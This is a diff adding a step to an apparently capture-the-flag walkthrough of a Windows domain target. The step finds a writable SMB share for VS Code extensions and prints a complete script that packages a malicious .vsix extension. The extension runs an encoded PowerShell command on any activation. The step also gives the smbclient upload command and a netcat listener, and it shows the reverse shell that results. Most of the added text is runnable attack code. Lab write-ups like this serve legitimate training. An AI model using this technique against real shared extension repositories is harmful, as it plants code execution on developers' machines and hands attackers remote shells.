@@ -42,3 +42,84 @@ fake_dc $dc nxc smb $ip -u mark.davies -p $pass
 
 <mark style="color:blue;">**Step 3**</mark>&#x20;
 
+**Mark user has write permissions over a share**
+
+{% code overflow="wrap" %}
+```bash
+fake_dc $dc nxc smb $ip -u $user -p $pass --shares
+ # DevDrop         READ,WRITE             VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
+```
+{% endcode %}
+
+**so the main idea that i start with every time i see write on a share is to put a malicious file that get executed after searching we need to create a malicious .vsix extensions put into a rev shell**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+#!/bin/bash
+# gen_malicious_ext.sh - Generates evil VS Code: extension for DevDrop
+# Usage: ./gen_malicious_ext.sh
+
+mkdir -p malicious-ext/out && cd malicious-ext
+
+cat > package.json << 'EOF'
+{
+  "name": "malicious-ext",
+  "displayName": "Malicious Extension",
+  "description": "System extension",
+  "version": "1.0.0",
+  "publisher": "checkpoint",
+  "engines": {
+    "vscode": "^1.118.0"
+  },
+  "categories": ["Other"],
+  "activationEvents": ["*"],
+  "main": "./out/extension.js",
+  "contributes": {}
+}
+EOF
+
+cat > out/extension.js << 'EOF'
+const vscode = require('vscode');
+const { exec } = require('child_process');
+
+function activate(context) {
+    exec('powershell -e <BASE64>', (error, stdout, stderr) => {
+        console.log(stdout);
+    });
+}      
+
+function deactivate() {}
+
+module.exports = { activate, deactivate };
+EOF
+
+# Install vsce if not present
+if ! command -v vsce &> /dev/null; then
+    echo "[+] Installing vsce..."
+    npm install -g @vscode/vsce
+fi
+
+# Package it
+echo "[+] Packaging extension..."
+vsce package
+
+echo "[+] Done! Upload with:"
+echo "    smbclient //TARGET_IP/DevDrop -U 'DOMAIN\\User' -p 'PASSWORD' -c 'put malicious-ext-1.0.0.vsix'"
+echo ""
+echo "[+] Start listener: nc -lvnp 9001"
+
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```bash
+listener 9001
+# connect to [10.10.14.63] from (UNKNOWN) [10.129.13.33] 64710
+
+PS C:\Program Files\Microsoft VS Code>  whoami
+checkpoint\ryan.brooks
+```
+{% endcode %}
+
+<mark style="color:blue;">**Step 4**</mark>
+
